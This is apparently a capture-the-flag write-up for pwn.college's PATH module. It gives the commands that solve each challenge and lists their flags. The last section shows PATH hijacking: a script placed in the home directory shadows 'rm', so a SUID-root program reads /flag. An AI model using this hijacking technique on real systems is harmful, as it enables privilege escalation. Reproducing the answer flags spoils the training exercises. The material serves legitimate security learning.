# Pondering PATH

Module Description: To learn about PATH and environment variables


## The PATH Variable

The challenge instructs us to disrupt the working of the `/challenge/run` file by setting the `PATH` to something else.


```
~$ PATH=""
~$ /challenge/run
```

flag: `pwn.college{QQAiBi7jAwjBrCimCQyIKzrym98.dZzNwUDL2MDO0czW}`


## setting PATH

The challenge instructs us to put the `/challenge/more_commands/` directory to the PATH so that the `/challenge/run` file can run `/challenge/more_commands/win` with it's bare name `win` to get the flag:-


```
~$ PATH=/challenge/more_commands/win
~$ /challenge/run
```

flag: `pwn.college{cx2LG9cUMndLY2tOGgwMy6CRB-v.dVzNyUDL2MDO0czW}`


## adding commands

This challenge asks us to make a script `win` to read the `/flag` file and add the file path of `win` to PATH so that it can be called by the `/challenge/run` file by it's bare name.

Unlike the previous time,  we cannot just set `PATH=/home/hacker/win` as then we will not be able to read the flag because the `cat` command won't work. So we append the path of the `win` file to PATH.

```
~$ touch win; echo "cat /flag" > win; chmod +x win
~$ export PATH="$PATH:/home/hacker/"
```

Now on running, `/challenge/run` we get the flag.

flag: `pwn.college{8jczWtkE1ualI1WjqoNfCyIFD0Y.dZzNyUDL2MDO0czW}	`

## hijacking commands

> This was hard.

> Initial approaches: trying to make a symlink to /flag, trying to edit the /run/workspace/bin/rm file 

On running, `which rm` I see `/run/workspace/bin/rm`, I can make `rm` be something else if I place a particular path before the `/run/workspace/bin` in `PATH`. That path will be `/home/hacker`

We know, the `/challenge/run` tries to execute `rm` so let's make `rm` be something else:-

```
~$ touch rm
~$ PATH="$HOME:$PATH"
```

now run, `which rm`:-

```
/home/hacker/rm
```

now we can make `rm` read the flag, `/challenge/run` file has the SUID bit so it runs as if `root` was running it. When that file tries to execute `rm` it will execute something else which will help us read the `/flag` file.

```
~$ echo "cat /flag" > rm
~$ chmod +x rm
```

now when `rm` is executed it will read the `/flag`:-

```
~$ /challenge/run

Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{EDNWyovq5R7TsYMLOH-rcr2Y9kF.ddzNyUDL2MDO0czW}
```

